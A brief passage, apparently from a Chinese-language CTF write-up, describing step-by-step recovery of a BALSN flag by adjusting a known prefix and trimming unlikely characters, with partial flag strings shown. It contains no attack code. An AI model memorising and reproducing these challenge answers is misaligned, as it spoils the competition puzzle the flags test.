+<code>b&rsquo;BALSN{nU\x00\x00_1s_s0oO0O_1oP\x00\x00\x00\x00\x00\x00_iN_c7F!!}'</code>
+更新一下 <code>prefix</code> 再測一次</p></p><p><img src=https://github.com/user-attachments/assets/62752e70-9ba5-4c0a-9b23-3b86620d12d8 alt=image></p><p>這次的結果數量就少很多，可以試著把 printable 的字元增加一些或全部使用。
 執行後看起來還是沒有合理的單字，可能是有單字是錯的，所以把不太像的字元拔掉
 <code>b'BALSN{\x00\x00\x00\x00_1s_s0oO0O_1\x00\x00\x00\x00\x00\x00\x00\x00_iN_c7F!!}'</code>
 更新一下 <code>prefix</code> 再測一次，結果一樣，再刪，這次刪最後面的 <code>!</code> 看看。
